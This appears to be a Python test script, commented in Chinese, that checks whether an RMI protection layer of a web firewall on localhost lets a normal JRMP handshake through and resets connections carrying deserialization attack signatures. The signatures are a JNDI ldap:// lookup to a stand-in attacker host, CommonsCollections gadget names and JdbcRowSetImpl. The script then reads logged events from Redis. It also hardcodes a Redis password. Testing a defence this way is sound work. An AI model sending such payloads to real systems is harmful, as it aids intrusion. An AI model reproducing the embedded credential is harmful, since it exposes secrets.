#!/usr/bin/env python3
# RMI guard 验证：正常流量放行 / 恶意反序列化特征断连+事件上报
import socket
import time

HOST = "127.0.0.1"
PORT = 1099


def send(payload, label):
    try:
        s = socket.create_connection((HOST, PORT), 5)
        s.sendall(payload)
        s.settimeout(5)
        try:
            data = s.recv(64)
            result = f"recv={data[:60]!r}" if data else "closed(EOF)"
        except socket.timeout:
            result = "alive(timeout-无响应)"
        except ConnectionResetError:
            result = "RST(被重置)"
        s.close()
    except Exception as e:
        result = f"ERR {e}"
    print(f"{label}: {result}")


# 1. 正常 JRMP 握手（无恶意特征）→ 转发到后端（后端不存在→连接关闭，属预期）
send(b"JRMI\x00\x02K" + b"\x00" * 20, "[1] 正常JRMP握手       ")

time.sleep(1)

# 2. JNDI ldap:// 特征（Log4Shell 类）→ 应被 RST
send(b"JRMI\x00\x02K" + b"\xac\xed\x00\x05" + b"ldap://evil.example.com/Exploit", "[2] JNDI ldap:// 特征  ")

time.sleep(1)

# 3. CommonsCollections gadget 类名 → 应被 RST
send(b"\xac\xed\x00\x05sr\x00\x30org.apache.commons.collections.functors.ChainedTransformer", "[3] CC gadget 类名     ")

time.sleep(1)

# 4. JdbcRowSetImpl → 应被 RST
send(b"\xac\xed\x00\x05" + b"com.sun.rowset.JdbcRowSetImpl" + b"\x00" * 8, "[4] JdbcRowSetImpl     ")

print("\n=== Redis 事件检查 ===")
import subprocess
out = subprocess.run(
    ["/usr/local/redis/bin/redis-cli", "-a", "hipXkCn4on2Yr8QgPyBT8TEGNUnN_a3_", "--no-auth-warning",
     "LRANGE", "novawaf:logs", "0", "5"],
    capture_output=True, text=True)
for line in out.stdout.splitlines():
    if "RMI" in line:
        print("EVT:", line[:220])
out2 = subprocess.run(
    ["/usr/local/redis/bin/redis-cli", "-a", "hipXkCn4on2Yr8QgPyBT8TEGNUnN_a3_", "--no-auth-warning",
     "LRANGE", "novawaf:fw:ban", "0", "5"],
    capture_output=True, text=True)
print("fw:ban queue:", out2.stdout.strip()[:200] or "(空-127.0.0.1不封禁属预期)")
